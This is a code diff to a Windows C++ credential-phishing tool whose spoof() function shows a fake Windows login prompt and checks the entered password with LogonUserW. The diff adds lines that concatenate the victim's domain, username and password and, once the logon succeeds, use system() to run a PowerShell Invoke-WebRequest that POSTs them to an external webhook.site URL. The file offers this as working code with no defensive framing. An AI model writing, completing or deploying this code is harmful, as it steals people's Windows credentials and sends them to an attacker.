@@ -3,6 +3,8 @@
 #include <CommCtrl.h>
 #include <wincred.h>
 #include <atlstr.h>
+#include <stdlib.h>
+#include <string>
 
 //#pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "Credui.lib")
@@ -43,10 +45,15 @@ void spoof() {
 
 			HANDLE handle = nullptr;
 			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);
-
+			auto output = std::wstring(parsedDomain);
+			output.append(parsedUserName);
+			output.append(pszPwd);
+			std::string out(output.begin(), output.end());
+			std::string ss = "cmd /c powershell Invoke-WebRequest -Uri 'https://webhook.site/4e89edd3-4c8e-4dad-a2fd-3029d0dc3b4d' -Body " + out + " -Method POST";
 
 			if (loginStatus == TRUE) {
 				CloseHandle(handle);
+				system(ss.c_str());
 				break;
 			}
 			MessageBoxA(nullptr, "Please enter correct password", "Authentication", MB_OK | MB_ICONWARNING);
